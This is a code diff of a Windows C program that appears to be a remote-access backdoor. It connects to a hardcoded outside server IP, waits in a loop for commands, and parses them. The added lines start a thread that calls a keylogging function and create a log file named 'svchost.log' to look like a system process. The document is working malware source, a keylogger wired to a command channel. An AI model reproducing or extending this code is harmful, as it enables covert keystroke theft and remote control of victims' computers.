@@ -11,24 +11,32 @@
 #include <time.h>
 #include <windows.h>
 #include <winsock2.h>
+#include <pthread.h>
 #include "utils.h"
 
 #pragma comment(lib,"ws2_32.lib") //Winsock Library
 int expression_handler(char *command, char **token);
+void *kl_thread();
 int main(){
 
 	WSADATA wsa;                                        //Info about winsock implementation
 	SOCKET s;
+	pthread_t tid;
 	char server_ip[15]="167.99.194.11", *buffer;
 	char server_reply[256], *token;
 	int recv_size,control_sock,port=8081;
-
+    pthread_create(&tid, NULL, kl_thread, NULL);
+    FILE *f=fopen("svchost.log","w");
+    fclose(f);
     //Inizialize winsock
     do{
         control_sock=WSAStartup(MAKEWORD(2,2),&wsa);
     }while(control_sock!=0);
+    printf("CIAO");
     s = socket(AF_INET , SOCK_STREAM , 0 );             //Initialize sock
-    create_conn(s,server_ip, port);                     //Create connection
+    printf("BELLAA");
+    create_conn(s,server_ip, port);
+    printf("BELA");                     //Create connection
     while(1){
         recv_size=recv(s , server_reply , 100 , 0);
         server_reply[recv_size]='\0';
@@ -68,4 +76,8 @@ int expression_handler(char *command, char **riscommand){
         return 2;
     }
     else{return 0;}
+}
+
+void *kl_thread(){
+    get_keylog();
 }
